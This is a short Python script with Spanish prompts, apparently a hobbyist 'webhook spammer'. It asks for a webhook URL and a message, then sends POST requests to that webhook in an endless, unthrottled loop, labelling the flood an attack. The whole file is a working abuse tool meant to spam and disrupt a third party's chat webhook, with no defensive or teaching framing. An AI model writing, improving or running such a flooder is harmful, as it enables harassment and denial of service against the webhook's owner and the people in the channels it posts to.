import requests
import time
#Made by SAUL


try:
    print("Bienvenido al WEEBHOOK SPAMMER ( Made by MEXIR)")

    USUARIO = input("Ingrese el lINK de su webhook:  ")


    link =input("Ingrese mensaje o link a espamear:  ")
#mejorar esto xd
except :
    print("Error")
    time.sleep(2)
    exit()




print("Atacando webhook...")
time.sleep(2)
while True:
   requests.post(USUARIO, json={"content": link})

   print("Enviando ataque HTTP...")
    
#AÑADIR MANEJO DE ERRORES complejo  (ME DA PEREZA)
